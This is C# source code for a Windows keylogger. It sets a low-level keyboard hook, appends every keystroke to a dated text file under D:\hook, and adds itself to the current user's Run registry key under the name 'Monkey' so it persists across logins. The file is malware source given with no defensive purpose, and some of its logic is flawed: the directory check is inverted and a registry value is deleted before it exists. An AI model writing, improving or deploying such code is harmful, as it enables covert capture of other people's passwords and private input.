using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.Win32;

class KeyHook
{
    #region Keycode 
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private const byte VK_RETURN = 0X0D; //Enter
    private const byte VK_SPACE = 0X20; //Space
    private const byte VK_SHIFT = 0x10;
    private const byte VK_CAPITAL = 0x14;
    #endregion

    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;

    
    public static string FILE_NAME = "D:\\hook\\sys.txt";

    public static void Main()
    {
        if (System.IO.Directory.Exists("D:\\hook"))
        {
            System.IO.Directory.CreateDirectory("D:\\hook");
        }
        FILE_NAME = "D:\\hook\\sys" + DateTime.Now.ToString("yyyyMMdd") + ".txt";
        _hookID = SetHook(_proc);
        RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
        rkApp.DeleteValue("Monkey");
        if (rkApp.GetValue("Monkey") == null)
        {
            rkApp.SetValue("Monkey", Application.ExecutablePath.ToString());
        }
       


        Application.Run();
        UnhookWindowsHookEx(_hookID);
    }

    private static IntPtr SetHook(LowLevelKeyboardProc proc)
    {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule)
        {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            bool isDownShift = ((GetKeyState(VK_SHIFT) & 0x80) == 0x80 ? true : false);
            bool isDownCapslock = (GetKeyState(VK_CAPITAL) != 0 ? true : false);
            int vkCode = Marshal.ReadInt32(lParam);
            char ch =' ';
            StreamWriter sr = File.AppendText(FILE_NAME);
            
            if ((isDownCapslock && isDownShift) || (!(isDownCapslock) && !(isDownShift)))
            {

                if (isDownCapslock == true)
                {
                    Console.WriteLine((Keys)vkCode);
                    sr.Write((Keys)vkCode);
                }
                else if (vkCode >= 0x41 && vkCode <= 0x5A)
                {
                    ch = Convert.ToChar(vkCode + 32);
                    sr.Write(ch);
                    Console.WriteLine(ch);
                }
                else if (vkCode == 0x20)
                {
                    sr.Write(ch);
                }
                else
                {
                    Console.WriteLine((Keys)vkCode);
                    sr.Write((Keys)vkCode);
                }
            }
            else
            {
               sr.Write((Keys)vkCode);
               Console.WriteLine((Keys)vkCode);
            }
            sr.Close();
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook,
        LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
        IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("user32.dll")]
    public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    [DllImport("user32.dll")]
    static extern short GetKeyState(int vKey);
}